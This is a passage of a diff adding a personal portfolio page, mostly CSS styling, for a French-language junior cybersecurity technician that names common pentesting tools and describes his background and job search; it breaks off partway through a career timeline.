+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+
+<style>
+/* ============================================================
+   ROOT + RESET
+============================================================ */
+:root {
+  --bg: #08090a;
+  --bg-2: #0e1011;
+  --ink: #ebe7df;
+  --ink-dim: #8a8780;
+  --ink-faint: #4a4945;
+  --line: #1a1b1d;
+  --line-2: #25272a;
+  --acid: #d2ff3a;
+  --warn: #ff5c2e;
+  --serif: 'Instrument Serif', 'Times New Roman', serif;
+  --mono: 'JetBrains Mono', ui-monospace, 'SF Mono', monospace;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--mono);
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 1.5;
+  letter-spacing: 0.01em;
+  overflow-x: hidden;
+  min-height: 100vh;
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+::selection { background: var(--acid); color: var(--bg); }
+
+/* ============================================================
+   GRAIN + ATMOSPHERE
+============================================================ */
+.grain {
+  position: fixed; inset: 0;
+  pointer-events: none; z-index: 9999;
+  opacity: 0.08;
+  mix-blend-mode: overlay;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+.scanlines {
+  position: fixed; inset: 0;
+  pointer-events: none; z-index: 9998;
+  background: repeating-linear-gradient(
+    to bottom,
+    transparent 0px, transparent 2px,
+    rgba(255,255,255,0.012) 2px, rgba(255,255,255,0.012) 3px
+  );
+}
+
+/* ============================================================
+   CUSTOM CURSOR (desktop only)
+============================================================ */
+.cursor-dot, .cursor-ring {
+  position: fixed; top: 0; left: 0;
+  pointer-events: none; z-index: 10000;
+  transform: translate(-50%, -50%);
+  mix-blend-mode: difference;
+}
+.cursor-dot {
+  width: 4px; height: 4px;
+  background: var(--acid);
+  border-radius: 50%;
+}
+.cursor-ring {
+  width: 32px; height: 32px;
+  border: 1px solid var(--ink);
+  border-radius: 50%;
+  transition: transform 0.18s cubic-bezier(0.2,0.9,0.3,1.4), width 0.2s, height 0.2s, border-color 0.2s;
+}
+.cursor-ring.hover { width: 60px; height: 60px; border-color: var(--acid); }
+@media (hover: none) { .cursor-dot, .cursor-ring { display: none; } }
+
+/* ============================================================
+   TOP BAR
+============================================================ */
+.topbar {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  align-items: center;
+  padding: 18px 28px;
+  background: rgba(8, 9, 10, 0.72);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--line);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+}
+.topbar .left { display: flex; align-items: center; gap: 16px; }
+.topbar .center { font-family: var(--serif); font-style: italic; font-size: 18px; letter-spacing: 0; text-transform: none; }
+.topbar .right { display: flex; align-items: center; justify-content: flex-end; gap: 16px; color: var(--ink-dim); }
+.dot-live {
+  display: inline-block;
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--acid);
+  box-shadow: 0 0 10px var(--acid);
+  animation: pulse 1.6s ease-in-out infinite;
+  margin-right: 6px;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.5; transform: scale(0.7); }
+}
+
+/* nav (mobile drawer + desktop links) */
+.nav-toggle {
+  display: none;
+  background: none; border: 1px solid var(--line-2);
+  color: var(--ink); padding: 6px 10px;
+  font-family: var(--mono); font-size: 11px;
+  letter-spacing: 0.12em; cursor: pointer;
+}
+.nav-links {
+  display: flex; gap: 22px;
+  list-style: none;
+}
+.nav-links a {
+  color: var(--ink-dim); text-decoration: none;
+  font-size: 11px; letter-spacing: 0.12em; text-transform: uppercase;
+  transition: color 0.2s;
+  position: relative;
+}
+.nav-links a::before { content: '⟶ '; color: var(--ink-faint); margin-right: 4px; opacity: 0; transition: opacity 0.2s, margin 0.2s; }
+.nav-links a:hover { color: var(--acid); }
+.nav-links a:hover::before { opacity: 1; margin-right: 6px; color: var(--acid); }
+
+@media (max-width: 800px) {
+  .topbar { grid-template-columns: 1fr auto 1fr; padding: 14px 18px; }
+  .topbar .right { display: none; }
+  .nav-toggle { display: inline-block; }
+  .nav-links {
+    position: fixed; top: 60px; right: 0;
+    flex-direction: column; gap: 0;
+    background: var(--bg); border-left: 1px solid var(--line);
+    padding: 24px; min-width: 60vw;
+    transform: translateX(100%);
+    transition: transform 0.4s cubic-bezier(0.7,0,0.3,1);
+    height: calc(100vh - 60px);
+  }
+  .nav-links.open { transform: translateX(0); }
+  .nav-links a { padding: 16px 0; border-bottom: 1px solid var(--line); font-size: 13px; }
+}
+
+/* ============================================================
+   LAYOUT WRAPPER
+============================================================ */
+main { padding-top: 60px; }
+.container { max-width: 1280px; margin: 0 auto; padding: 0 28px; }
+@media (max-width: 600px) { .container { padding: 0 18px; } }
+
+.section {
+  padding: 110px 0;
+  border-top: 1px solid var(--line);
+  position: relative;
+}
+.section:first-of-type { border-top: none; }
+.section-tag {
+  display: inline-flex; align-items: center; gap: 10px;
+  font-size: 11px; letter-spacing: 0.18em;
+  color: var(--ink-dim); text-transform: uppercase;
+  margin-bottom: 36px;
+}
+.section-tag::before {
+  content: ''; display: inline-block;
+  width: 24px; height: 1px; background: var(--ink-dim);
+}
+.section-num {
+  font-family: var(--serif);
+  font-size: 13px; color: var(--acid);
+  font-style: italic;
+}
+
+/* ============================================================
+   HERO
+============================================================ */
+.hero {
+  min-height: calc(100vh - 60px);
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  padding: 48px 0 32px;
+  position: relative;
+}
+.hero-top {
+  display: grid; grid-template-columns: 1fr auto 1fr;
+  align-items: start; gap: 24px;
+  font-size: 11px; color: var(--ink-dim);
+  letter-spacing: 0.1em; text-transform: uppercase;
+}
+.hero-top .label { color: var(--ink-faint); display: block; margin-bottom: 6px; }
+.hero-top .ascii {
+  font-family: var(--mono); color: var(--ink-faint); white-space: pre;
+  font-size: 9px; line-height: 1.1; text-align: center;
+}
+
+.hero-name {
+  margin: auto 0;
+  display: grid;
+  gap: 0;
+}
+.hero-name .first {
+  font-family: var(--serif);
+  font-style: italic;
+  font-size: clamp(64px, 14vw, 220px);
+  line-height: 0.92;
+  letter-spacing: -0.02em;
+  font-weight: 400;
+  display: block;
+  position: relative;
+}
+.hero-name .last {
+  font-family: var(--serif);
+  font-size: clamp(56px, 12.5vw, 200px);
+  line-height: 0.92;
+  letter-spacing: -0.03em;
+  font-weight: 400;
+  display: block;
+  margin-left: clamp(16px, 8vw, 140px);
+  color: var(--ink);
+}
+.hero-name .last::before {
+  content: '— ';
+  color: var(--acid);
+  font-style: italic;
+}
+
+.hero-bottom {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr 1fr;
+  gap: 32px;
+  padding-top: 48px;
+  border-top: 1px solid var(--line);
+  font-size: 12px;
+}
+.hero-bottom .col .k {
+  color: var(--ink-faint); text-transform: uppercase;
+  letter-spacing: 0.14em; font-size: 10px;
+  margin-bottom: 8px; display: block;
+}
+.hero-bottom .col .v { color: var(--ink); }
+.hero-bottom .col .v em {
+  font-family: var(--serif); font-style: italic;
+  font-size: 16px; color: var(--acid);
+  font-weight: 400;
+}
+
+@media (max-width: 700px) {
+  .hero-top { grid-template-columns: 1fr 1fr; }
+  .hero-top .ascii { display: none; }
+  .hero-bottom { grid-template-columns: 1fr 1fr; gap: 22px; }
+}
+
+/* Marquee under hero */
+.marquee {
+  border-top: 1px solid var(--line);
+  border-bottom: 1px solid var(--line);
+  overflow: hidden;
+  padding: 14px 0;
+  background: var(--bg);
+}
+.marquee-track {
+  display: flex; gap: 48px;
+  animation: scroll-x 40s linear infinite;
+  white-space: nowrap;
+  font-family: var(--serif); font-style: italic;
+  font-size: 32px;
+  color: var(--ink-dim);
+}
+.marquee-track span:nth-child(odd) { color: var(--acid); }
+.marquee-track .dot { font-family: var(--mono); font-size: 18px; align-self: center; color: var(--ink-faint); font-style: normal; }
+@keyframes scroll-x {
+  from { transform: translateX(0); }
+  to { transform: translateX(-50%); }
+}
+
+/* ============================================================
+   ABOUT
+============================================================ */
+.about-grid {
+  display: grid;
+  grid-template-columns: 1fr 1.4fr;
+  gap: 72px;
+  align-items: start;
+}
+.about-portrait {
+  position: sticky; top: 90px;
+  border: 1px solid var(--line);
+  padding: 18px;
+  background: var(--bg-2);
+}
+.portrait-frame {
+  aspect-ratio: 3/4;
+  background:
+    linear-gradient(135deg, rgba(210,255,58,0.08), transparent 60%),
+    repeating-linear-gradient(45deg, var(--line) 0 2px, transparent 2px 12px),
+    var(--bg);
+  display: flex; align-items: center; justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+.portrait-frame img {
+  width: 100%; height: 100%;
+  object-fit: cover;
+  filter: grayscale(0.4) contrast(1.05);
+}
+.portrait-frame .placeholder {
+  font-family: var(--serif); font-style: italic;
+  font-size: 96px; color: var(--ink-dim);
+  letter-spacing: -0.04em;
+}
+.portrait-frame::after {
+  content: ''; position: absolute; inset: 0;
+  background: linear-gradient(to top, rgba(8,9,10,0.5), transparent 40%);
+  pointer-events: none;
+}
+.portrait-meta {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 12px; margin-top: 18px;
+  font-size: 10px; color: var(--ink-dim);
+  letter-spacing: 0.1em; text-transform: uppercase;
+}
+.portrait-meta .k { color: var(--ink-faint); display: block; }
+.portrait-meta .v { color: var(--ink); }
+
+.about-prose h3 {
+  font-family: var(--serif);
+  font-size: clamp(32px, 4.5vw, 56px);
+  line-height: 1.05;
+  font-weight: 400;
+  letter-spacing: -0.02em;
+  margin-bottom: 28px;
+}
+.about-prose h3 em { color: var(--acid); }
+.about-prose p {
+  font-size: 15px;
+  line-height: 1.7;
+  color: var(--ink);
+  margin-bottom: 18px;
+  max-width: 60ch;
+}
+.about-prose p.lead {
+  font-family: var(--serif); font-style: italic;
+  font-size: 22px; color: var(--ink); line-height: 1.4;
+}
+
+.timeline {
+  margin-top: 48px;
+  border-top: 1px solid var(--line);
+}
+.timeline-row {
+  display: grid;
+  grid-template-columns: 100px 1fr auto;
+  gap: 24px;
+  padding: 22px 0;
+  border-bottom: 1px solid var(--line);
+  align-items: baseline;
+  transition: background 0.3s, padding 0.3s;
+}
+.timeline-row:hover { background: var(--bg-2); padding-left: 12px; padding-right: 12px; }
+.timeline-row .year {
+  font-family: var(--serif); font-style: italic;
+  font-size: 22px; color: var(--acid);
+}
+.timeline-row .desc { font-size: 14px; }
+.timeline-row .desc strong { display: block; margin-bottom: 4px; font-weight: 500; }
+.timeline-row .desc span { color: var(--ink-dim); font-size: 12px; }
+.timeline-row .tag {
+  font-size: 10px; padding: 4px 8px;
+  border: 1px solid var(--line-2);
+  letter-spacing: 0.1em; text-transform: uppercase;
+  color: var(--ink-dim);
+}
+.timeline-row.current .tag { color: var(--acid); border-color: var(--acid); }
+
+@media (max-width: 900px) {
+  .about-grid { grid-template-columns: 1fr; gap: 40px; }
+  .about-portrait { position: static; max-width: 320px; }
+  .timeline-row { grid-template-columns: 80px 1fr; }
+  .timeline-row .tag { grid-column: 1/-1; justify-self: start; }
+}
+
+/* ============================================================
+   SKILLS
+============================================================ */
+.skills-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 0;
+  border: 1px solid var(--line);
+}
+.skill-card {
+  padding: 32px;
+  border-right: 1px solid var(--line);
+  border-bottom: 1px solid var(--line);
+  position: relative;
+  transition: background 0.3s;
+  cursor: default;
+}
+.skill-card:nth-child(2n) { border-right: none; }
+.skill-card:nth-last-child(-n+2) { border-bottom: none; }
+.skill-card:hover { background: var(--bg-2); }
+.skill-card:hover .skill-bar-fill { width: var(--w); }
+.skill-card .num {
+  font-family: var(--serif); font-style: italic;
+  font-size: 14px; color: var(--ink-faint);
+  position: absolute; top: 18px; right: 18px;
+}
+.skill-card .icon {
+  font-size: 22px; color: var(--acid);
+  margin-bottom: 24px;
+}
+.skill-card h4 {
+  font-family: var(--serif);
+  font-size: 36px; font-weight: 400;
+  letter-spacing: -0.02em;
+  margin-bottom: 8px;
+  line-height: 1.05;
+}
+.skill-card .desc {
+  color: var(--ink-dim); font-size: 13px;
+  margin-bottom: 24px; max-width: 36ch;
+}
+.skill-card .skill-bar {
+  display: flex; align-items: center; gap: 12px;
+  font-size: 11px; color: var(--ink-dim);
+  letter-spacing: 0.1em; text-transform: uppercase;
+}
+.skill-bar-track {
+  flex: 1; height: 1px;
+  background: var(--line-2);
+  position: relative; overflow: hidden;
+}
+.skill-bar-fill {
+  position: absolute; top: 0; left: 0; height: 100%;
+  width: 0;
+  background: var(--acid);
+  transition: width 1.4s cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.skill-bar-fill::after {
+  content: ''; position: absolute; right: 0;
+  width: 6px; height: 6px;
+  background: var(--acid);
+  transform: translate(50%, -50%);
+  top: 50%;
+  border-radius: 50%;
+  box-shadow: 0 0 8px var(--acid);
+}
+.skill-card .stack {
+  margin-top: 18px;
+  display: flex; flex-wrap: wrap; gap: 6px;
+}
+.skill-card .stack span {
+  font-size: 10px; padding: 3px 7px;
+  border: 1px solid var(--line-2);
+  color: var(--ink-dim);
+  letter-spacing: 0.06em;
+}
+
+@media (max-width: 700px) {
+  .skills-grid { grid-template-columns: 1fr; }
+  .skill-card { border-right: none; padding: 24px; }
+  .skill-card:nth-last-child(-n+2) { border-bottom: 1px solid var(--line); }
+  .skill-card:last-child { border-bottom: none; }
+  .skill-card h4 { font-size: 28px; }
+}
+
+/* ============================================================
+   PROJECTS
+============================================================ */
+.projects-list {
+  border-top: 1px solid var(--line);
+}
+.project-row {
+  display: grid;
+  grid-template-columns: 80px 1fr auto auto;
+  gap: 32px;
+  align-items: center;
+  padding: 32px 0;
+  border-bottom: 1px solid var(--line);
+  cursor: pointer;
+  transition: padding 0.4s cubic-bezier(0.7,0,0.3,1), background 0.3s;
+  position: relative;
+}
+.project-row::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: var(--acid);
+  transform-origin: left;
+  transform: scaleX(0);
+  z-index: -1;
+  opacity: 0.04;
+  transition: transform 0.5s cubic-bezier(0.7,0,0.3,1);
+}
+.project-row:hover { padding-left: 24px; padding-right: 24px; }
+.project-row:hover::after { transform: scaleX(1); }
+.project-row:hover .project-arrow { transform: translate(8px, -2px) rotate(-15deg); color: var(--acid); }
+.project-row:hover .project-title { color: var(--acid); font-style: italic; }
+
+.project-num {
+  font-family: var(--serif); font-style: italic;
+  font-size: 22px; color: var(--ink-faint);
+}
+.project-content { min-width: 0; }
+.project-title {
+  font-family: var(--serif);
+  font-size: clamp(24px, 3.5vw, 44px);
+  font-weight: 400;
+  letter-spacing: -0.02em;
+  line-height: 1.05;
+  margin-bottom: 8px;
+  transition: color 0.3s, font-style 0.3s;
+}
+.project-meta {
+  display: flex; gap: 16px; flex-wrap: wrap;
+  font-size: 11px; color: var(--ink-dim);
+  letter-spacing: 0.08em; text-transform: uppercase;
+}
+.project-meta .pill {
+  padding: 3px 8px;
+  border: 1px solid var(--line-2);
+}
+.project-status {
+  font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase;
+  color: var(--acid);
+  display: flex; align-items: center; gap: 6px;
+  white-space: nowrap;
+}
+.project-status::before {
+  content: ''; width: 6px; height: 6px;
+  background: var(--acid); border-radius: 50%;
+  box-shadow: 0 0 8px var(--acid);
+}
+.project-arrow {
+  font-family: var(--serif); font-style: italic;
+  font-size: 32px; color: var(--ink-dim);
+  transition: transform 0.4s cubic-bezier(0.5,0,0.3,1.4), color 0.3s;
+}
+
+@media (max-width: 700px) {
+  .project-row { grid-template-columns: 50px 1fr; gap: 16px; padding: 22px 0; }
+  .project-status, .project-arrow { display: none; }
+  .project-row:hover { padding-left: 12px; padding-right: 12px; }
+  .project-meta { font-size: 10px; }
+}
+
+/* ============================================================
+   PROJECT MODAL
+============================================================ */
+.modal-backdrop {
+  position: fixed; inset: 0;
+  background: rgba(8,9,10,0.85);
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+  z-index: 1000;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.4s;
+}
+.modal-backdrop.open { opacity: 1; pointer-events: all; }
+.modal {
+  position: fixed;
+  top: 0; right: 0; bottom: 0;
+  width: min(720px, 92vw);
+  background: var(--bg);
+  border-left: 1px solid var(--line);
+  z-index: 1001;
+  transform: translateX(100%);
+  transition: transform 0.5s cubic-bezier(0.7,0,0.2,1);
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+}
+.modal.open { transform: translateX(0); }
+.modal-inner { padding: 32px; }
+.modal-close {
+  position: sticky; top: 0;
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 8px 0 24px;
+  background: linear-gradient(to bottom, var(--bg) 70%, transparent);
+  z-index: 2;
+}
+.modal-close button {
+  background: none; border: 1px solid var(--line-2);
+  color: var(--ink); padding: 8px 14px;
+  font-family: var(--mono); font-size: 11px;
+  letter-spacing: 0.12em; text-transform: uppercase;
+  cursor: pointer; transition: all 0.2s;
+}
+.modal-close button:hover { background: var(--acid); color: var(--bg); border-color: var(--acid); }
+.modal-close .meta { font-size: 11px; color: var(--ink-dim); letter-spacing: 0.1em; text-transform: uppercase; }
+
+.modal h2 {
+  font-family: var(--serif);
+  font-size: clamp(36px, 5vw, 56px);
+  font-weight: 400;
+  letter-spacing: -0.02em;
+  line-height: 1.05;
+  margin: 12px 0 8px;
+}
+.modal h2 em { color: var(--acid); }
+.modal .subtitle {
+  color: var(--ink-dim);
+  font-size: 13px; margin-bottom: 32px;
+  padding-bottom: 24px;
+  border-bottom: 1px solid var(--line);
+}
+.modal-section { margin-bottom: 32px; }
+.modal-section h4 {
+  font-size: 11px; letter-spacing: 0.16em;
+  text-transform: uppercase; color: var(--ink-dim);
+  margin-bottom: 16px;
+  display: flex; align-items: center; gap: 10px;
+}
+.modal-section h4::before {
+  content: ''; width: 16px; height: 1px; background: var(--acid);
+}
+.modal-section p { color: var(--ink); font-size: 14px; line-height: 1.7; margin-bottom: 12px; }
+.modal-section ul { list-style: none; padding: 0; }
+.modal-section ul li {
+  padding: 8px 0;
+  border-bottom: 1px dashed var(--line);
+  font-size: 13px;
+  display: flex; gap: 12px;
+}
+.modal-section ul li::before {
+  content: '⟶'; color: var(--acid); flex-shrink: 0;
+}
+.modal-section ul li code {
+  font-family: var(--mono); color: var(--acid);
+  background: var(--bg-2); padding: 2px 6px;
+  font-size: 12px;
+}
+.modal-stack { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 12px; }
+.modal-stack .pill {
+  font-size: 11px; padding: 5px 10px;
+  border: 1px solid var(--line-2);
+  color: var(--ink); letter-spacing: 0.06em;
+}
+.modal-stack .pill:hover { border-color: var(--acid); color: var(--acid); }
+.code-block {
+  background: var(--bg-2);
+  border: 1px solid var(--line);
+  padding: 18px 20px;
+  font-family: var(--mono); font-size: 12px;
+  line-height: 1.7;
+  color: var(--ink-dim);
+  overflow-x: auto;
+  margin: 12px 0;
+  position: relative;
+}
+.code-block::before {
+  content: '$ ' attr(data-label);
+  display: block;
+  font-size: 10px;
+  color: var(--ink-faint);
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  margin-bottom: 10px;
+  padding-bottom: 8px;
+  border-bottom: 1px dashed var(--line-2);
+}
+.code-block .cmt { color: var(--ink-faint); font-style: italic; }
+.code-block .cmd { color: var(--acid); }
+.code-block .arg { color: var(--ink); }
+
+.warn-box {
+  border-left: 2px solid var(--warn);
+  background: rgba(255,92,46,0.06);
+  padding: 14px 18px;
+  font-size: 13px; color: var(--ink);
+  margin: 14px 0;
+}
+.warn-box strong { color: var(--warn); }
+
+@media (max-width: 600px) {
+  .modal-inner { padding: 22px; }
+  .modal h2 { font-size: 32px; }
+}
+
+/* ============================================================
+   CONTACT
+============================================================ */
+.contact-wrap {
+  display: grid;
+  grid-template-columns: 1.2fr 1fr;
+  gap: 64px;
+  align-items: start;
+}
+.contact-headline {
+  font-family: var(--serif);
+  font-size: clamp(48px, 8vw, 120px);
+  line-height: 0.95;
+  letter-spacing: -0.03em;
+  font-weight: 400;
+}
+.contact-headline em { color: var(--acid); }
+.contact-headline .small {
+  display: block; font-size: 16px; font-style: italic;
+  color: var(--ink-dim); margin-top: 24px;
+  font-family: var(--serif); letter-spacing: 0;
+  line-height: 1.5; max-width: 36ch;
+}
+
+.contact-card {
+  border: 1px solid var(--line);
+  background: var(--bg-2);
+  padding: 32px;
+}
+.contact-card .label {
+  font-size: 10px; letter-spacing: 0.16em;
+  text-transform: uppercase; color: var(--ink-faint);
+  margin-bottom: 24px;
+  display: flex; justify-content: space-between;
+}
+.contact-row {
+  display: block;
+  padding: 16px 0;
+  border-bottom: 1px solid var(--line);
+  text-decoration: none; color: var(--ink);
+  transition: padding 0.3s, color 0.3s;
+}
+.contact-row:hover { padding-left: 12px; color: var(--acid); }
+.contact-row:last-child { border-bottom: none; }
+.contact-row .k {
+  display: block; font-size: 10px; color: var(--ink-faint);
+  letter-spacing: 0.14em; text-transform: uppercase;
+  margin-bottom: 4px;
+}
+.contact-row .v {
+  font-family: var(--serif); font-size: 22px;
+  font-style: italic; letter-spacing: 0;
+}
+.contact-actions {
+  display: flex; gap: 12px; margin-top: 24px;
+  flex-wrap: wrap;
+}
+.btn {
+  flex: 1; min-width: 140px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  padding: 14px 18px;
+  font-family: var(--mono); font-size: 11px;
+  letter-spacing: 0.14em; text-transform: uppercase;
+  background: transparent; color: var(--ink);
+  border: 1px solid var(--line-2);
+  text-decoration: none;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative; overflow: hidden;
+}
+.btn::before {
+  content: ''; position: absolute; inset: 0;
+  background: var(--acid);
+  transform: translateY(101%);
+  transition: transform 0.4s cubic-bezier(0.7,0,0.3,1);
+  z-index: -1;
+}
+.btn:hover { color: var(--bg); border-color: var(--acid); }
+.btn:hover::before { transform: translateY(0); }
+.btn.primary { background: var(--acid); color: var(--bg); border-color: var(--acid); }
+.btn.primary::before { background: var(--bg); }
+.btn.primary:hover { color: var(--ink); }
+
+.socials {
+  margin-top: 24px;
+  display: flex; gap: 18px;
+}
+.socials a {
+  width: 44px; height: 44px;
+  border: 1px solid var(--line-2);
+  display: inline-flex; align-items: center; justify-content: center;
+  color: var(--ink); text-decoration: none;
+  font-size: 16px;
+  transition: all 0.3s;
+}
+.socials a:hover {
+  background: var(--acid); color: var(--bg);
+  border-color: var(--acid);
+  transform: translateY(-3px);
+}
+
+@media (max-width: 800px) {
+  .contact-wrap { grid-template-columns: 1fr; gap: 40px; }
+}
+
+/* ============================================================
+   FOOTER
+============================================================ */
+footer {
+  border-top: 1px solid var(--line);
+  padding: 32px 0;
+  font-size: 11px;
+  color: var(--ink-dim);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+.footer-grid {
+  display: grid; grid-template-columns: 1fr auto 1fr;
+  align-items: center;
+  gap: 16px;
+}
+.footer-grid .center { text-align: center; }
+.footer-grid .right { text-align: right; }
+.footer-grid em { font-family: var(--serif); font-style: italic; color: var(--acid); letter-spacing: 0; text-transform: none; font-size: 13px; }
+
+@media (max-width: 600px) {
+  .footer-grid { grid-template-columns: 1fr; text-align: center; }
+  .footer-grid .right { text-align: center; }
+}
+
+/* ============================================================
+   ENTRY ANIMATIONS
+============================================================ */
+.reveal { opacity: 0; transform: translateY(24px); transition: opacity 0.9s ease, transform 0.9s cubic-bezier(0.2,0.8,0.2,1); }
+.reveal.in { opacity: 1; transform: translateY(0); }
+.reveal-1 { transition-delay: 0.05s; }
+.reveal-2 { transition-delay: 0.15s; }
+.reveal-3 { transition-delay: 0.25s; }
+.reveal-4 { transition-delay: 0.35s; }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation: none !important; transition: none !important; }
+}
+</style>
 </head>
 <body>
-    <!-- Login Page -->
-    <div id="loginContainer" class="login-container">
-        <div class="anime-background">
-            <div class="anime-silhouette silhouette-1"></div>
-            <div class="anime-silhouette silhouette-2"></div>
-            <div class="anime-silhouette silhouette-3"></div>
-            <div class="anime-silhouette silhouette-4"></div>
-            
-            <div class="manga-text text-1">SECURITY</div>
-            <div class="manga-text text-2">CYBER</div>
-            <div class="manga-text text-3">CODE</div>
-            <div class="manga-text text-4">HACK</div>
+
+<div class="grain"></div>
+<div class="scanlines"></div>
+
+<div class="cursor-dot" id="cursorDot"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<!-- ============================================================
+     TOP BAR
+============================================================ -->
+<header class="topbar">
+  <div class="left">
+    <span><span class="dot-live"></span>SYS / OPERATIONAL</span>
+  </div>
+  <div class="center">Elhoussayn<sup style="font-size:0.5em;color:var(--acid);">⊹</sup></div>
+  <div class="right">
+    <button class="nav-toggle" id="navToggle" aria-label="Menu">MENU ⊹</button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#about" data-link>01 / Profil</a></li>
+      <li><a href="#skills" data-link>02 / Stack</a></li>
+      <li><a href="#projects" data-link>03 / Dossiers</a></li>
+      <li><a href="#contact" data-link>04 / Contact</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+
+<!-- ============================================================
+     HERO
+============================================================ -->
+<section class="hero container">
+  <div class="hero-top">
+    <div>
+      <span class="label">Subject_File</span>
+      <span>OUBENMOUSSA.E / 0x2007</span>
+    </div>
+    <pre class="ascii">
+   ╔═══════════════╗
+   ║  CYBER—DOSSIER ║
+   ║   v.2026.05    ║
+   ╚═══════════════╝</pre>
+    <div style="text-align:right">
+      <span class="label">Status</span>
+      <span style="color:var(--acid)">Available · Junior · TSSR</span>
+    </div>
+  </div>
+
+  <div class="hero-name reveal">
+    <span class="first">Elhoussayn</span>
+    <span class="last">Oubenmoussa</span>
+  </div>
+
+  <div class="hero-bottom">
+    <div class="col reveal reveal-1">
+      <span class="k">Rôle</span>
+      <span class="v"><em>Technicien</em><br>Cybersécurité Junior</span>
+    </div>
+    <div class="col reveal reveal-2">
+      <span class="k">Localisation</span>
+      <span class="v">Béziers,<br>France <em>—</em> 34</span>
+    </div>
+    <div class="col reveal reveal-3">
+      <span class="k">Spécialité</span>
+      <span class="v">Sécurité offensive<br>& <em>réseaux</em></span>
+    </div>
+    <div class="col reveal reveal-4">
+      <span class="k">Disponibilité</span>
+      <span class="v">Stage / Alternance<br><em>CDI</em> Junior</span>
+    </div>
+  </div>
+</section>
+
+<!-- Marquee -->
+<div class="marquee">
+  <div class="marquee-track">
+    <span>Penetration Testing</span><span class="dot">◇</span>
+    <span>Kali Linux</span><span class="dot">◇</span>
+    <span>Wireless Security</span><span class="dot">◇</span>
+    <span>Network Analysis</span><span class="dot">◇</span>
+    <span>VeraCrypt</span><span class="dot">◇</span>
+    <span>Wireshark</span><span class="dot">◇</span>
+    <span>Metasploit</span><span class="dot">◇</span>
+    <span>Penetration Testing</span><span class="dot">◇</span>
+    <span>Kali Linux</span><span class="dot">◇</span>
+    <span>Wireless Security</span><span class="dot">◇</span>
+    <span>Network Analysis</span><span class="dot">◇</span>
+    <span>VeraCrypt</span><span class="dot">◇</span>
+    <span>Wireshark</span><span class="dot">◇</span>
+    <span>Metasploit</span><span class="dot">◇</span>
+  </div>
+</div>
+
+<!-- ============================================================
+     ABOUT
+============================================================ -->
+<section class="section" id="about">
+  <div class="container">
+    <div class="section-tag"><span class="section-num">— 01</span> Profil opérationnel</div>
+
+    <div class="about-grid">
+      <aside class="about-portrait reveal">
+        <div class="portrait-frame">
+          <!-- Replace this with: <img src="image/nn.jpeg" alt="Elhoussayn Oubenmoussa"> -->
+          <img src="image/nn.jpeg" alt="Elhoussayn Oubenmoussa" onerror="this.outerHTML='<span class=\'placeholder\'>EO</span>'">
+        </div>
+        <div class="portrait-meta">
+          <div><span class="k">Âge</span><span class="v">18 ans</span></div>
+          <div><span class="k">Origine</span><span class="v">Maroc · 2023</span></div>
+          <div><span class="k">Langues</span><span class="v">AR · FR (B2)</span></div>
+          <div><span class="k">Statut</span><span class="v">Recherche active</span></div>
+        </div>
+      </aside>
+
+      <div class="about-prose">
+        <h3 class="reveal">Auto-formé,<br>opérationnel,<br><em>passionné depuis 2023.</em></h3>
+
+        <p class="lead reveal reveal-1">
+          Jeune marocain de 18 ans, arrivé en France en 2023. La cybersécurité m'a happé dès les premiers mois — depuis, j'apprends en autodidacte avec une rigueur de pentester.
+        </p>
+
+        <p class="reveal reveal-2">
+          Je construis mes compétences à travers des projets concrets en environnement de test isolé : Kali Linux, Wireshark, Aircrack-ng, Metasploit. J'aime comprendre comment les choses cassent — pour mieux les défendre.
+        </p>
+
+        <p class="reveal reveal-2">
+          Aujourd'hui accompagné par la <strong style="color:var(--acid)">Mission Locale</strong> et inscrit à <strong style="color:var(--acid)">France Travail</strong>, je cherche un poste de Technicien Cybersécurité Junior ou une formation TSSR pour transformer cette passion en métier.
+        </p>
+
+        <div class="timeline reveal reveal-3">
+          <div class="timeline-row">
+            <span class="year">2022</span>
+            <div class="desc"><strong>Seconde Bac Pro Menuiserie Bois</strong><span>Maroc · 2 mois — réorientation</span></div>
+            <span class="tag">Parcours</span>
+          </div>
+          <div class="timeline-row">
+            <span class="year">2023</span>
